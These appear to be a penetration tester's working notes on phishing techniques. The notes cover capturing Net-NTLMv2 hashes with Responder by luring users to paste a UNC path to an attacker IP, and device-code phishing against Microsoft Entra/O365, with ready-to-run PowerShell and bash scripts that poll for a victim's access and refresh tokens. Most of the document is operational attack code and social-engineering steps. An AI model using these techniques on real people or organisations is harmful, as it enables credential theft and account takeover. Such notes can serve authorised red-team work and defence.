
## Responder
---
My organizations will block smb ingress, but not egress. Allowing an attacker to spin up responder on a public IP and capture Net-NTLMv2 hashes over the internet. 

Technique: convince user to win+r and paste UNC path into run box
```
\\<publicip>\payroll.docx
```

Responder should catch a hash. Try to crack!

## Evilginx
---

## Device Code
---
https://aadinternals.com/post/phishing/
#### Manual Approach

Make a POST with resource & client_id
- Client ID = ID of app you want access to [list here](https://rakhesh.com/azure/well-known-client-ids/)
- Resource = prolly graph if you're targeting a normal user. (Entra & O365)

powershell
```powershell
$body=@{
    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "resource" =  "https://graph.microsoft.com"
}

$authResponse=(Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body)
$authResponse
```

or

```powershell
curl -s -X POST \  -H 'Content-Type: application/x-www-form-urlencoded' \  -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.microsoft.com' \  "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" | jq
```

Then script to query the endpoint waiting for response, once received, it will print our access & refresh token

```powershell
$response = ""
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

$body=@{
    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" = $authResponse.device_code
    "resource" = "https://graph.microsoft.com"
}

while($continue)
{
    Start-Sleep -Seconds $interval
    $total += $interval

    if($total -gt $expires)
    {
        Write-Error "Timeout occurred"
        return
    }

    try
    {
        $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
    }
    catch
    {
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Host $details.error

        if(!$continue)
        {
            Write-Error $details.error_description
            return
        }
    }

    if($response)
    {
      break
    }
}
$response.access_token
```

or

```bash
#!/bin/bash

auth_interval=5
auth_expires_in=900
auth_device_code="<device-code>"

# MSFT Resource & App:
client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c" # this is office
resource="https://graph.microsoft.com" # for entra & o365
token_url="https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
grant_type="urn:ietf:params:oauth:grant-type:device_code"

continue_polling=true
total_wait_time=0
response=""

echo "Polling for authorization..."

while [ "$continue_polling" = true ]; do
    sleep "$auth_interval"
    total_wait_time=$((total_wait_time + auth_interval))

    # Check for timeout
    if (( total_wait_time > auth_expires_in )); then
        echo "Error: Timeout occurred. Authorization was not completed in time." >&2
        exit 1
    fi

    response=$(curl -sS -X POST "$token_url" \
      -d "client_id=$client_id" \
      -d "grant_type=$grant_type" \
      -d "code=$auth_device_code" \
      -d "resource=$resource")

    if echo "$response" | jq -e '.error' > /dev/null; then
        error_code=$(echo "$response" | jq -r '.error')
        if [ "$error_code" = "authorization_pending" ]; then
            echo "$error_code"
        else
            error_description=$(echo "$response" | jq -r '.error_description')
            echo "Error: $error_description" >&2
            exit 1
        fi
    else
        break
    fi
done

echo "Authorization successful!"
echo "$response" | jq 
```

#### Use AzureCLI instead

```bash
az login --use-device-code
```

